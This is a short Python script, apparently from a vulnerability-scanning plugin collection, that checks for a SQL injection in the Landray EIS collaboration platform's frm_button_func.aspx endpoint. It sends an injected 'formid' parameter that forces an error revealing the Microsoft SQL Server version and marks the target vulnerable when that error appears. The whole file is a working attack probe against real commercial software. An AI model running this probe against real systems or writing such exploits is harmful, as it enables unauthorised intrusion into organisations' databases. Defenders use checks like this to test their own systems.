import requests
import urllib

def verify(url):
    relsult = {
        'name': '蓝凌EIS智慧协同平台frm_button_func.aspx接口SQL注入',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Connection': 'close'
    }
    vurl = urllib.parse.urljoin(url, "/frm/frm_button_func.aspx?formid=1%20and%201=@@version--+")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 500 and 'Microsoft' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult